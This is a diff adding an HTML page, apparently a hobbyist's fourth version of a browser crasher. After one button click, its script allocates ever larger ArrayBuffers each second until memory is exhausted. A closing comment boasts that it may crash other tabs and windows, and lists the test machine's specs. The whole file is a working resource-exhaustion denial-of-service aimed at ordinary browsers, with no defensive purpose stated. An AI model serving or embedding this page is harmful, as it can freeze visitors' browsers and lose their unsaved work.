@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+	<body>
+		<button onclick=crash()>Click to start crashing</button>
+		<div id=buffSize></div>
+		<div id=info></div>
+		<p>Verbose output:</p>
+		<ul></ul>
+		<script>
+			function crash() {
+				document.querySelector('button').setAttribute('disabled', 'true');
+				let bufferSize = 1;
+				let buffSize = document.querySelector('#buffSize');
+				let info = document.querySelector('#info');
+				let buffArr = [];
+				let limit = false;
+				let ul = document.querySelector('ul');
+
+				setInterval(function() {
+					let li = document.createElement('li');
+					info.innerText = 'Creating buffer...';
+					try {
+						buffArr.push(new ArrayBuffer(!limit ? bufferSize *= 2 : bufferSize));
+						buffSize.innerText = 'Buffer size is ' + bufferSize + ' bytes.';
+
+						li.innerText = `Buffer with a size of ${bufferSize} created.`;
+						ul.appendChild(li);
+					} catch(e) {
+						li.innerText = `Hit size limit at ${bufferSize} bytes! Setting back to ${bufferSize /= 2}.`;
+						ul.appendChild(li);
+						limit = true;
+					}
+					info.innerText = 'Buffer created. Waiting...';
+				}, 1000);
+			}
+		</script>
+	</body>
+</html>
+
+<!--
+Version 4.
+Features:
+- Dynamic buffer size control
+- Verbose output
+- May crash other tabs/windows too!
+
+Tested on the same ol' potato as before;
+Specs:
+- RAM: 4GB DDR3 (3.68GB usable)
+- Browser: Google Chrome x64 version 81.0.4044.138
+- OS: Windows 10 Home x64 v1903 (OS build 18362.592)
+- Processor: Intel(R) Core(TM) i3 CPU M 380 @ 2.53GHz x4
+-->
